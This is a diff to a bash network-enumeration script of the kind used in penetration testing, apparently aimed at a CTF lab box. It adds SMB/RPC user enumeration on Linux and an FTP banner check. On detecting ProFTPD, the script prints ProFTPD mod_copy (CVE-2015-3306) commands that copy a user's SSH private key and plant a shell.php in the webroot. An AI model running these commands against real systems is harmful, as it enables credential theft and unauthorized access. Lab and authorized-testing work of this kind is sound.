@@ -45,7 +45,7 @@ while getopts "i:u:p:d:H:o:h" opt; do
     esac
 done
 
-# Function to check if a port is open (uses nc if available, falls back to /dev/tcp)
+# Function to check if a port is open (uses bash /dev/tcp)
 check_port() {
     target_ip=$1
     target_port=$2
@@ -54,15 +54,10 @@ check_port() {
     # Skip check if we don't know the IP (shouldn't happen)
     if [ -z "$target_ip" ]; then return 0; fi
 
-    # Use nc if available
-    if command -v nc &> /dev/null; then
-        nc -z -w 1 "$target_ip" "$target_port" 2>/dev/null
-        result=$?
-    else
-        # Fallback to bash pseudo-device
-        (timeout 1 bash -c "</dev/tcp/$target_ip/$target_port") 2>/dev/null
-        result=$?
-    fi
+    # Use bash built-in TCP connection for reliability (avoids nc version/flag issues)
+    # Timeout set to 2 seconds
+    (timeout 2 bash -c "</dev/tcp/$target_ip/$target_port") &>/dev/null
+    result=$?
 
     if [ $result -eq 0 ]; then
         return 0 # Port is open
@@ -383,8 +378,9 @@ else
     echo -e "\n\033[93m[!] Skipping Windows-specific Guest/Anonymous SMB checks (target OS: Linux)\033[0m"
 fi
 
-# Skip Windows-specific anonymous RPC/AD enumeration for Linux
-if [ "$os_type" = "windows" ]; then
+# Skip Windows-specific anonymous RPC/AD enumeration for Linux UNLESS SMB is open (Samba)
+# Modified to allow check on Linux if port 445/139 is open
+if [ "$os_type" = "windows" ] || check_port $IP 445 || check_port $IP 139; then
     echo -e "\n\033[96m[+] Anonymous RPC User Enumeration (lookupsid.py)\033[0m"
     echo "# Attempting anonymous SID bruteforce to enumerate users..."
     # Try anonymous first
@@ -1325,6 +1321,57 @@ else
     echo -e "\n\033[93m[!] Skipping SSH/FTP Enumeration (no username supplied)\033[0m"
 fi
 
+# FTP Unauthenticated / Banner Grab (Check for ProFTPD Exploit)
+echo -e "\n\033[96m[+] FTP Banner Grab & Exploit Check (Port 21):\033[0m"
+if check_port $IP 21; then
+    echo -e "\033[92m[+] FTP port 21 is OPEN!\033[0m"
+    
+    # Grab banner
+    echo "# FTP Banner:"
+    ftp_banner=$(timeout 2 nc -nv $IP 21 2>/dev/null)
+    echo "$ftp_banner"
+    
+    # Check for ProFTPD mod_copy exploit (CVE-2015-3306)
+    # This specifically looks for ProFTPD which affects versions <= 1.3.5
+    if echo "$ftp_banner" | grep -qi "ProFTPD"; then
+        echo -e "\n\033[93m[!] ProFTPD detected! Possible mod_copy vulnerability (CVE-2015-3306)\033[0m"
+        
+        # Determine target user for the path
+        target_user="kenobi" # Fallback default
+        
+        # 1. Use manual argument if provided
+        if [ -n "$user" ]; then
+            target_user="$user"
+        else
+            # 2. Try to find a user from enumeration (lookupsid/rpc)
+            # Find the most recent users file from the 'users_*.txt' pattern
+            users_file=$(ls -t nxc-enum/smb/users_*.txt 2>/dev/null | head -n1)
+            
+            if [ -f "$users_file" ] && [ -s "$users_file" ]; then
+                # Get first user from the file
+                found_user=$(head -n 1 "$users_file")
+                if [ -n "$found_user" ]; then
+                     target_user="$found_user"
+                fi
+            fi
+        fi
+
+        echo -e "\033[96m[+] Try manual exploitation with nc (copy files without auth):\033[0m"
+        echo "nc $IP 21"
+        echo "SITE CPFR /home/$target_user/.ssh/id_rsa"
+        echo "SITE CPTO /var/tmp/id_rsa"
+        echo "SITE CPFR /var/www/html/index.php"
+        echo "SITE CPTO /var/www/html/shell.php"
+        echo ""
+    fi
+    
+    echo -e "\033[96m[+] Manual connection:\033[0m"
+    echo "nc -nv $IP 21"
+    echo ""
+else
+    echo -e "\033[93m[!] FTP (Port 21) seems closed.\033[0m"
+fi
+
 # Telnet Enumeration (using available tool checking)
 echo -e "\n\033[96m[+] Telnet Enumeration (Port 23):\033[0m"
 if check_port $IP 23; then
@@ -1334,10 +1381,12 @@ if check_port $IP 23; then
     echo "nc -nv $IP 23"
     echo ""
     echo "# Banner grab:"
-    timeout 2 nc -nv $IP 23 2>/dev/null
+    timeout 2 nc -nv $IP 23
     echo ""
 else
-    echo -e "\033[93m[!] Telnet (23) is closed\033[0m"
+    echo -e "\033[93m[!] Telnet (Port 23) seems closed.\033[0m"
+    echo -e "    If you believe this is an error, try manually:"
+    echo "    nc -nv $IP 23"
 fi
 
 # Advanced DACL enumeration (requires credentials)
